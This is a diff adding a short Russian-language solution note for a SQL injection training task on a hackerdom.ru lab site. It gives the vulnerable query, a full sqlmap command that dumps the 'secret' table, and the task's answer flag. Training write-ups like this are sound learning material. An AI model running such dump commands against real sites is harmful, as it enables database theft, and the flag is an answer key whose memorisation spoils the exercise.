@@ -1,0 +1,17 @@
+https://sql.training.hackerdom.ru/5sdfkjsdk.php
+-----------------------------------------------
+
+Таблицы: users, secret
+Поля таблицы users: id, login, pass
+В таблице secret два поля
+Запрос: SELECT * FROM users WHERE id=2 OR login='$text' LIMIT 1
+
+sqlmap:
+sqlmap -u "https://sql.training.hackerdom.ru/5sdfkjsdk.php?text=1" -D sql_level5 -T secret --dump --batch 
+
+
+Честно, не придумал как решать эту таску без sqlmap, но скорее всего что то связанное с information_schema.columns
+
+
+Ответ: 
+thisisapass232
